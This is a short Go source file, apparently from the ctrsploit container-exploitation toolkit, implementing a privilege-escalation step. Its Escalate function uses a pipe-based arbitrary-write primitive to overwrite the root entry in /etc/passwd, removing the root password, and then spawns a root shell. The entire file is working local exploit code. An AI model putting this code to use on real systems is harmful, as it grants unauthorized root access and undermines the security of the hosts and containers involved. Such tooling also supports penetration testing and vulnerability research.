package pipe_primitive

import "github.com/ctrsploit/ctrsploit/util"

func Escalate(primitive Primitive) (err error) {
	offset, err := getRootPasswdOffset()
	if err != nil {
		return
	}
	payload := []byte(":0:0:root:/root:/bin/bash\n")
	err = primitive.Write("/etc/passwd", int64(offset), payload)
	if err != nil {
		return
	}
	util.InvokeRootShell()
	return
}
